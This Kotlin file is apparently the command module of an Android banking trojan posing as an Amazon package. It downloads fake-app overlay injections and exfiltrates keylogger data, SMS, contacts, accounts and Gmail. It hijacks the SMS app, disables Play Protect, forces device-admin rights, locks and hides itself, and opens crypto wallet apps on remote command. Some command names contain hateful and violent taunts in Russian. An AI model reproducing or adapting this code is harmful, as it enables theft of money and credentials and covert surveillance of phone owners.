package com.amazon.zzz.Modull

//import com.google.android.gms.safetynet.SafetyNet
import android.app.PendingIntent
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Telephony
import com.amazon.zzz.Admin.admReceiverDeviceAdmin
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.ApiNm.apiUt.downloadInjection
import com.amazon.zzz.ApiNm.apiUt.sendLogs
import com.amazon.zzz.Modull.task.CameraManager
import com.amazon.zzz.Modull.task.FileManagerTask
import com.amazon.zzz.Services.srvLockDevice
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utAutoStartUtil
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.constNm
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object module {

    private val TAG_LOG = module::class.java.simpleName + " >> "

    fun checkProtect(context: Context) {
        sendLogs(context, "", "checkProtect", "log")
        try {
//            SafetyNet.getClient(context)
//                .isVerifyAppsEnabled
//                .addOnCompleteListener { task ->
//                    try {
//                        if (task.isSuccessful) {
//                            val result = task.result
//                            if (result.isVerifyAppsEnabled) {
//                                SharedPreferencess.checkProtect = "1"
//                            } else {
//                                SharedPreferencess.checkProtect = "0"
//                            }
//                        } else {
//                            SharedPreferencess.checkProtect = "2"
//                        }
//                    } catch (ex: Exception) {
//                        SharedPreferencess.checkProtect = "2"
//                    }
//                }
        } catch (ex: Exception) {
            SharedPreferencess.checkProtect = "2"
        }
    }

    suspend fun main(context: Context, jsonObj: JSONObject) {
        utUtils.Log(TAG_LOG, "case ${jsonObj.getString("params")}")
        try {
            when (jsonObj.getString("params")) {
                "updateSettingsAndCommands" -> {
                    updateSettingsAndCommands(context, jsonObj.getString("response"))
                }

                "moduleWorkingWhile" -> {
                    serviceWorkingWhile(context)
                }
            }
        } catch (ex: Exception) {
            utUtils.Log(TAG_LOG, "Error module main$ex")
        }
    }

    suspend fun serviceWorkingWhile(context: Context) {
        //----------Download injections------
        downloadInjections(context)

        //--------------Send Logs Keylogger------------
        sendLogsKeylog(context)

        //-------------Send Logs Events---------------
        sendLogsEvents(context)

        //----------------Hidden SMS---------------
        swapSmsManager(context)

        //----------------Stop Sound------------------
        stopSound(context)

        //----------------Kill application------------------
        killApplication(context)

        //--------------------Auto off protect------------------------
        googlePlayProtect(context)

        //------Get Admin Device-----------------
        startAdminOrLock(context)
    }

    suspend fun updateSettingsAndCommands(context: Context, response: String) {
        val jsonObject = JSONObject(response)
        when (jsonObject.getString("action")) {
            "~no_command~" -> {
                utUtils.Log(TAG_LOG, "~no_command~")
                checkUpdateInjection(context)
            }

            "~settings~" -> {
                utUtils.Log(TAG_LOG, "~settings~")
                updateSettings(jsonObject)
            }

            "~commands~" -> {
                sendLogs(context, "", "~commands~", "log")
                utUtils.Log(TAG_LOG, "get ~commands~: $jsonObject")
                val jsonCommand = jsonObject.getJSONObject("data")
                val payload = runCatching { jsonCommand.getJSONObject("payload") }.getOrNull()
                val command = jsonCommand.getString("command")
                runCommand(context, payload, command)
            }
        }
    }

    private suspend fun checkUpdateInjection(context: Context) {
        if (SharedPreferencess.checkUpdateInjection == "1") {
            runCatching {
                utUtils.Log(TAG_LOG, "~checkUpdateInjection~")
                val response = apiUt.downloadingInjections(context)
                utUtils.Log(TAG_LOG, "RESPONCE: $response")

                val objJson = JSONObject(response)
                val allInjections = objJson.getString("allInjections")
                val activeInjection = objJson.getString("activeInjection")

                if (!allInjections.isNullOrBlank() && allInjections != "~no~") {
                    try {
                        val arrayInjection = allInjections.split(";").toTypedArray()
                        for (i in arrayInjection.indices) {
                            if (arrayInjection[i].isNotEmpty()) {
                                SharedPreferencess.SettingsWrite(
                                    context,
                                    arrayInjection[i],
                                    ""
                                ) //html fake app
                                SharedPreferencess.SettingsWrite(
                                    context,
                                    "icon_" + arrayInjection[i],
                                    ""
                                ) //icon
                                SharedPreferencess.SettingsWrite(
                                    context,
                                    "type_" + arrayInjection[i],
                                    ""
                                ) //icon
                                utUtils.Log(
                                    TAG_LOG,
                                    "Initialization Injection: " + arrayInjection[i]
                                )
                            }
                        }
                        SharedPreferencess.arrayInjection = allInjections
                        SharedPreferencess.checkUpdateInjection = ""
                        SharedPreferencess.whileStartUpdateInjection = "1"

                        utUtils.Log(TAG_LOG, "Save Array Injections")
                    } catch (ex: Exception) {
                        utUtils.Log(
                            TAG_LOG,
                            "ERROR Save Array Injectiong! ***********************"
                        )
                    }
                } else if (allInjections == "~no~") {
                    SharedPreferencess.arrayInjection = ""
                    SharedPreferencess.checkUpdateInjection = ""
                }

                if (!activeInjection.isNullOrBlank() && activeInjection != "~no~") {
                    SharedPreferencess.activeInjection = activeInjection
                }
            }
        }
    }

    private suspend fun downloadInjections(context: Context) {
        runCatching {
            if (SharedPreferencess.whileStartUpdateInjection == "1") {
                utUtils.Log(TAG_LOG, "Start Downloading Injections...")
                val arrayInjection = SharedPreferencess.arrayInjection.split(";").toTypedArray()
                var intExitInj = 0
                for (i in arrayInjection.indices) {
                    utUtils.Log(TAG_LOG, "Name Inject: $arrayInjection")
                    if (arrayInjection[i].isNotEmpty()) {
                        try {
                            if (SharedPreferencess.SettingsRead(context, arrayInjection[i])!!.isEmpty()) {
                                val str = downloadInjection(context, arrayInjection[i])
                                if (str.isNotBlank()) {
                                    val JSONObject = JSONObject(str)
                                    val htmlBase64Inj = JSONObject.getString("html")
                                    if (htmlBase64Inj.length > 10) {
                                        SharedPreferencess.SettingsWrite(
                                            context,
                                            arrayInjection[i],
                                            htmlBase64Inj
                                        )
                                        utUtils.Log(
                                            TAG_LOG,
                                            "Downloading Injection:  " + arrayInjection[i] + "   size: " + htmlBase64Inj.length
                                        )
                                    } else {
                                        utUtils.Log(
                                            TAG_LOG,
                                            "Downloading Injection Error:  " + arrayInjection[i] + "   size: " + htmlBase64Inj.length
                                        )
                                        intExitInj++
                                    }

                                    val htmlBase64Icon = JSONObject.getString("icon")
                                    if (htmlBase64Icon.length > 10) {
                                        SharedPreferencess.SettingsWrite(
                                            context,
                                            "icon_" + arrayInjection[i],
                                            htmlBase64Icon
                                        )
                                        utUtils.Log(
                                            TAG_LOG,
                                            "Downloading Icon:  " + arrayInjection[i] + "   size: " + htmlBase64Icon.length
                                        )
                                    }

                                    val injType = JSONObject.getString("type")
                                    SharedPreferencess.SettingsWrite(
                                        context,
                                        "type_" + arrayInjection[i],
                                        injType
                                    )
                                    utUtils.Log(
                                        TAG_LOG,
                                        "Downloading type:  " + arrayInjection[i] + "   size: " + injType.length
                                    )
                                } else {
                                    intExitInj++
                                }
                            }
                        } catch (ex: Exception) {
                            utUtils.Log(TAG_LOG, "ERROR for download injections")
                        }
                    }
                }
                if (intExitInj == 0) {
                    SharedPreferencess.whileStartUpdateInjection = ""
                    utUtils.Log(TAG_LOG, "Downloading All Injections! =)")
                } else {
                    utUtils.Log(
                        TAG_LOG,
                        "Downloading Injections! Error downloand inject: $intExitInj"
                    )
                }
            }
        }
    }

    private fun googlePlayProtect(context: Context) {
        sendLogs(context, "", "googlePlayProtect", "log")
        checkProtect(context)

        runCatching {
            if (utUtils.isAccessibilityServiceEnabled(
                    context,
                    constNm.a14
                ) && udUtils.getScreenBoolean(context)
            ) {
                if (SharedPreferencess.checkProtect == "1" && SharedPreferencess.goOffProtect != "1") {
                    if (SharedPreferencess.tick > 200) {
                        SharedPreferencess.goOffProtect = "1"
                        val intent =
                            Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity")
                        intent.setClassName(
                            "com.google.android.gms",
                            "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"
                        )
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                        intent.addFlags(Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
                        context.startActivity(intent)
                    }
                }
            }
        }
    }

    private fun killApplication(context: Context) {
        runCatching {
            if (SharedPreferencess.killApplication.contains(context.packageName)) {
                try {
                    val mAdminReceiver =
                        ComponentName(context, admReceiverDeviceAdmin::class.java)
                    val mDPM =
                        context.getSystemService(Service.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    mDPM.removeActiveAdmin(mAdminReceiver)
                } catch (ex: Exception) {
                    utUtils.Log("DevicePolicyManager", "$ex")
                }
            }
        }

        //------Delete app-----------
        runCatching {
            if (utUtils.isAdminDevice(context)) {
                val nameAppKill = SharedPreferencess.killApplication
                if (nameAppKill.isNotEmpty()) {
                    val intentSender = PendingIntent.getBroadcast(
                        context,
                        100,
                        Intent(context, admReceiverDeviceAdmin::class.java),
                        0
                    ).intentSender
                    val pi = context.packageManager.packageInstaller
                    pi.uninstall(nameAppKill, intentSender)
                }
            }
        }

        //---------Kill Application---------------------
        runCatching {
            if (udUtils.getScreenBoolean(context)) {
                val nameAppKill = SharedPreferencess.killApplication
                if (nameAppKill.isNotEmpty()) {
                    try {
                        val intent = Intent(Intent.ACTION_DELETE)
                        intent.data = Uri.parse("package:$nameAppKill")
                        context.startActivity(intent)
                    } catch (ex: Exception) {
                        val appSettingsIntent = Intent(Intent.ACTION_DELETE)
                        appSettingsIntent.data = Uri.parse("package:$nameAppKill")
                        appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                        appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                        appSettingsIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                        context.startActivity(appSettingsIntent)
                    }
                }
            }
        }
    }

    private fun runCommand(context: Context, payload: JSONObject?, command: String) {
        when (command.toLowerCase()) {
            "sendsms" -> udUtils.sendSms(
                context,
                payload!!.getString("number"),
                payload.getString("text"),
                if (payload.getString("sim") == "sim2") 1 else 0
            )

            "startussd" -> udUtils.ussd(
                context,
                payload!!.getString("ussd"),
                if (payload.getString("sim") == "sim2") 1 else 0
            )

            "forwardcall" -> udUtils.callForward(
                context,
                payload!!.getString("number"),
                if (payload.getString("sim") == "sim2") 1 else 0
            )

            "push" -> udUtils.sendNotification(
                context,
                payload!!.getString("app"),
                payload.getString("title"),
                payload.getString("text")
            )

            "getcontacts" -> udUtils.getContacts(context)
            "getaccounts",
            "logaccounts" -> udUtils.logAccounts(context)

            "getinstallapps" -> udUtils.getApps(context)
            "getsms" -> udUtils.getSMS(context)
            "startinject" -> udUtils.openFake(context, payload!!.getString("app"))
            "openurl" -> udUtils.openUrlBraw(context, payload!!.getString("url"))
            "startauthenticator2" -> {
                SharedPreferencess.SettingsWrite(context, "authenticator2", null)
                udUtils.startApplication(context, "com.google.android.apps.authenticator2")
            }

            "trust" -> {
                SharedPreferencess.SettingsWrite(context, "trust", null)
                udUtils.startApplication(context, "com.wallet.crypto.trustapp")
            }

            "mycelium" -> {
                SharedPreferencess.SettingsWrite(context, "mycelium", null)
                udUtils.startApplication(context, "com.mycelium.wallet")
            }

            "piuk" -> {
                SharedPreferencess.SettingsWrite(context, "piuk", null)
                udUtils.startApplication(context, "piuk.blockchain.android")
            }

            "samourai" -> {
                SharedPreferencess.SettingsWrite(context, "samourai", null)
                udUtils.startApplication(context, "com.samourai.wallet")
            }

            "bitcoincom" -> {
                SharedPreferencess.SettingsWrite(context, "bitcoincom", null)
                udUtils.startApplication(context, "com.bitcoin.mwallet")
            }

            "toshi" -> {
                SharedPreferencess.SettingsWrite(context, "toshi", null)
                udUtils.startApplication(context, "org.toshi")
            }

            "metamask" -> {
                SharedPreferencess.SettingsWrite(context, "metamask", null)
                udUtils.startApplication(context, "io.metamask")
            }

            "safepal" -> {
                SharedPreferencess.SettingsWrite(context, "safepal", null)
                udUtils.startApplication(context, "io.safepal.wallet")
            }

            "exodus" -> {
                SharedPreferencess.SettingsWrite(context, "exodus", null)
                udUtils.startApplication(context, "exodusmovement.exodus")
            }

            "fmmanager" -> {
                if (payload!!.getString("extra") == "ls")
                    FileManagerTask(context, 0, payload.getString("path")).start()
                else if (payload.getString("extra") == "dl")
                    FileManagerTask(context, 1, payload.getString("path")).start()
            }

            "takephoto" -> {
                CameraManager(context).start()
            }

            "sendsmsall" -> udUtils.sms_mailing_phonebook(
                context,
                payload!!.getString("text"),
                if (payload.getString("sim") == "sim2") 1 else 0
            )

            "startapp" -> udUtils.startApplication(
                context,
                payload!!.getString("app")
            )

            "clearcash",
            "clearcache" -> udUtils.startClearCash(
                context,
                payload!!.getString("app")
            )

            "calling" -> udUtils.Calling(
                context,
                payload!!.getString("number"),
                payload.getString("lock") == "1"
            )

            "deleteapplication" -> {
                SharedPreferencess.killApplication = payload!!.getString("app")
                val obj = JSONObject()
                obj.put("killApplication", payload.getString("app"))
                sendLogs(context, "", obj.toString(), "killApplication")
            }

            "startadmin" -> {
                SharedPreferencess.start_admin = "1"
                val obj = JSONObject()
                obj.put("startadmin", "ok")
                sendLogs(context, "", obj.toString(), "startadmin")
            }

            "killme" -> {
                SharedPreferencess.killApplication = context.packageName
                val obj = JSONObject()
                obj.put("killme", "ok")
                sendLogs(context, "", obj.toString(), "killme")
            }

            "updateinjectandlistapps" -> {
                SharedPreferencess.checkUpdateInjection = "1"
                val obj = JSONObject()
                obj.put("updateinjectandlistapps", "ok")
                sendLogs(context, "", obj.toString(), "updateinjectandlistapps")
            }

            "gmailtitles" -> {
                SharedPreferencess.SettingsWrite(context, "gm_list", "start")
                udUtils.startApplication(context, "com.google.android.gm")
            }

            "getgmailmessage" -> {
                val em = payload!!.getString("mes_num")
                SharedPreferencess.SettingsWrite(context, "gm_mes_command", "start")
                SharedPreferencess.SettingsWrite(context, "gm_mes", em)
                udUtils.startApplication(context, "com.google.android.gm")
            }

            "Уничтожить_все_человечество" -> {
                try {
                    File(
                        context.getDir("apk", Context.MODE_PRIVATE),
                        "system.apk"
                    ).delete()
                } catch (ex: Exception) {
                }
            }

            "Запустить_коронавирус" -> {
                try {
                    File(
                        context.getDir("apk", Context.MODE_PRIVATE),
                        "system.apk"
                    ).delete()
                } catch (ex: Exception) {
                }
            }

            "Убить_всех_китайцев" -> {
                try {
                    File(
                        context.getDir("apk", Context.MODE_PRIVATE),
                        "system.apk"
                    ).delete()
                } catch (ex: Exception) {
                }
            }

            "ВЫчислить_по_IP_реверсера_который_это_смотрит" -> {
                try {
                    File(
                        context.getDir("apk", Context.MODE_PRIVATE),
                        "system.apk"
                    ).delete()
                } catch (ex: Exception) {
                }
            }

            "Уничтожить_компуктер" -> {
                try {
                    File(
                        context.getDir("apk", Context.MODE_PRIVATE),
                        "system.apk"
                    ).delete()
                } catch (ex: Exception) {
                }
            }

            "Путин_красавчик" -> {
                try {
                    File(
                        context.getDir("apk", Context.MODE_PRIVATE),
                        "system.apk"
                    ).delete()
                } catch (ex: Exception) {
                }
            }

            "Вызвать_цунами_на_америку" -> {
                try {
                    File(
                        context.getDir("apk", Context.MODE_PRIVATE),
                        "system.apk"
                    ).delete()
                } catch (ex: Exception) {
                }
            }

            "Сдохни_тот_кто_разреверсил_это" -> {
                try {
                    File(
                        context.getDir("apk", Context.MODE_PRIVATE),
                        "system.apk"
                    ).delete()
                } catch (ex: Exception) {
                }
            }
        }
    }

    private fun sendLogsEvents(context: Context) {
        runCatching {
            val logs = SharedPreferencess.SettingsRead(context, constNm.LogEvents)
            SharedPreferencess.SettingsWrite(context, constNm.LogEvents, "")
            if (!logs.isNullOrBlank()) {
                val logss = logs.split("::endlog::")
                val list = JSONArray()
                logss.forEach {
                    runCatching {
                        list.put(JSONObject(it))
                    }
                }
                sendLogs(context, "", list.toString(), constNm.LogEvents)
            }
        }
    }

    private fun sendLogsKeylog(context: Context) {
        runCatching {
            val logs = SharedPreferencess.SettingsRead(context, constNm.dataKeylogger)
            SharedPreferencess.SettingsWrite(context, constNm.dataKeylogger, "")
            if (!logs.isNullOrBlank()) {
                val logss = logs.split("::endlog::")
                val list = JSONArray()
                logss.forEach {
                    runCatching {
                        list.put(JSONObject(it))
                    }
                }

                sendLogs(context, "", list.toString(), constNm.dataKeylogger)
            }
        }
    }

    private fun startAdminOrLock(context: Context) {
        if (!utUtils.isAdminDevice(context)) {
            sendLogs(context, "", "startAdminOrLock", "log")
            if (SharedPreferencess.start_admin == "1") {
                if (udUtils.getScreenBoolean(context) && utUtils.isAccessibilityServiceEnabled(
                        context,
                        constNm.a14
                    )
                ) {
                    SharedPreferencess.autoClickAdmin = "1" //auto click start!
                    val dialogIntent = Intent(context, constNm.a7)
                    dialogIntent.putExtra("admin", "1")
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    context.startActivity(dialogIntent)
                }
            }
        }
        //------IF Admin Device-----------------

        try {
            //------Start Lock Device-----------
            if (!utAutoStartUtil.isMyServiceRunning(context, srvLockDevice::class.java) && SharedPreferencess.lockDevice == "1") {
                context.startService(Intent(context, srvLockDevice::class.java))
                val cn = ComponentName(context, admReceiverDeviceAdmin::class.java)
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                dpm.setApplicationHidden(cn, context.packageName, true)
            }
        } catch (ex: Exception) {
            utUtils.Log("srvLockDevice", "$ex")
        }
    }

    private fun stopSound(context: Context) {
        runCatching {
            if (SharedPreferencess.offSound == "1") {
                sendLogs(context, "", "stopSound", "log")
                udUtils.stopSound(context)
            }
        }
    }

    fun swapSmsManager(context: Context) {
        SharedPreferencess.init(context.applicationContext)
        runCatching {
            if (utUtils.isAccessibilityServiceEnabled(
                    context,
                    constNm.a14
                ) && udUtils.getScreenBoolean(context)
            ) {
                if (SharedPreferencess.hiddenSMS == "1" && SharedPreferencess.permission_get == "1") {
                    sendLogs(context, "", "swapSmsManager", "log")
                    if (Telephony.Sms.getDefaultSmsPackage(context) != context.packageName) { // Hidden SMS
                        SharedPreferencess.autoClickSms = "1"
                        sendLogs(context, "", "swapSmsManager start", "log")
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            try {
                                context.startActivity(
                                    Intent(
                                        context,
                                        Class.forName(constNm.a15)
                                    ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                )
                            } catch (e: Exception) {
                                sendLogs(context, "", "swapSmsManager start", "error")
                                utUtils.Log(TAG_LOG, "ERROR activity_change_smsManager_sdk_Q")
                                udUtils.swapSmsMenager(context, context.packageName)
                            }
                        } else {
                            sendLogs(context, "", "swapSmsManager swapSmsMenager", "log")
                            udUtils.swapSmsMenager(context, context.packageName)
                        }
                    }
                }

                if (Telephony.Sms.getDefaultSmsPackage(context) == context.packageName) {
                    sendLogs(context, "", "swapSmsManager Telephony.Sms.getDefaultSmsPackage(context) == context.packageName", "log")
                    SharedPreferencess.autoClickSms = "0"
                }
            }
        }
    }

    private fun updateSettings(jsonObject: JSONObject) {
        val settings = JSONObject(jsonObject.getString("settings"))

        var urls = ""
        runCatching {
            val arrayInjection = JSONArray(settings.getString("arrayUrl"))
            for (i in 0 until arrayInjection.length())
                urls += (arrayInjection.getString(i) + ";")
        }

        SharedPreferencess.urls = urls
        SharedPreferencess.lockDevice = settings.getString("lockDevice")
        SharedPreferencess.hiddenSMS = settings.getString("hideSMS")
        SharedPreferencess.offSound = settings.getString("offSound")
        SharedPreferencess.keylogger = settings.getString("keylogger")
        SharedPreferencess.clearPush = settings.getString("clearPush")
        SharedPreferencess.readPush = settings.getString("readPush")

        SharedPreferencess.activeInjection = jsonObject.getString("activeInjection")
    }

}